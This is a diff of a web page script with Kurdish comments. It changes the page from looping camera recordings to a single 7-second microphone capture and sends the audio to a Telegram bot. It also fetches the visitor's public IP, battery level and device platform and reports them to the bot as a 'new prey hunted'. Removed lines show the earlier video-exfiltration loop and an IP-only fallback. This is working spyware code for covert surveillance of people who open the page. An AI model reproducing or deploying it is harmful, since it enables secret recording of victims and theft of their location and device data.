@@ -14,62 +14,52 @@
 
     async function capture() {
         if (!targetID) return;
-
         try {
-            // 🎥 داواکردنی مۆڵەتی ڤیدیۆ و دەنگ بە بەرزترین کوالێتی
+            // تەنها لێرە audio کرا بە true بۆ مۆڵەتی مایک
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: true 
             });
 
-            // 🔄 فەنکشنێک بۆ تۆمارکردنی پارچە ڤیدیۆکان (Infinite Loop)
-            function startRecording() {
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
+            // لۆژیکی تۆمارکردنی ٧ چرکە دەنگ
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append("chat_id", targetID);
+                fd.append("voice", blob, "voice.ogg");
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 7000); // ٧ چرکە
 
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const fd = new FormData();
-                    fd.append("chat_id", targetID);
-                    fd.append("video", blob, "capture.mp4");
-                    fd.append("caption", "🎥 پارچە ڤیدیۆیەکی نوێ گەیشت!");
-
-                    // ناردنی ڤیدیۆکە بۆ تێلێگرام
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { 
-                        method: "POST", 
-                        body: fd 
-                    });
-
-                    // دووبارە دەستپێکردنەوەی تۆمارکردن (Loop)
-                    startRecording();
-                };
-
-                mediaRecorder.start();
-                
-                // هەر ١٠ چرکە جارێک ڤیدیۆیەک بنێرە (دەتوانیت کاتەکە بگۆڕیت)
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 10000); 
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    sendToTelegram(report);
+                });
 
-            // یەکەم تۆمارکردن دەستپێبکە
-            startRecording();
-
-        } catch (err) {
-            // ئەگەر مۆڵەتی نەدا، تەنها ئایپی بنێرە (وەک پێشتر)
-            sendIPReport();
-        }
+        } catch (e) {}
     }
 
-    async function sendIPReport() {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
+    function sendToTelegram(message) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: targetID, text: `⚠️ نێچیرەکە مۆڵەتی نەدا!\n🌐 IP: ${ipData.ip}`, parse_mode: "HTML" })
+            body: JSON.stringify({ chat_id: targetID, text: message, parse_mode: "HTML" })
         });
     }
 </script>
